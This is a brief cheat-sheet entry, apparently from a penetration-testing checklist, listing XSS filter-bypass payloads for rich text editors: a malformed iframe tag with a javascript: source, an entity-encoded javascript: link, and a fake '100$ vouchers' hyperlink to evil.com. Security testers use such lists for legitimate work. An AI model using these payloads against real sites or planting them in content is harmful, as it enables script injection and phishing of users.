# Rich Editor/Text

*   [ ] **XSS Bypass for Rich Text Editors**

    ```js
    First, try all the built-in functions like bold, links, and embedded images.

    <</p>iframe src=javascript:alert()//
    <a href="aaa:bbb">x</a>
    <a href="j%26Tab%3bavascript%26colon%3ba%26Tab%3blert()">x</a>

    [Click on me to claim 100$ vouchers](<https://evil.com>) -> Hyperlink Injection
    ```
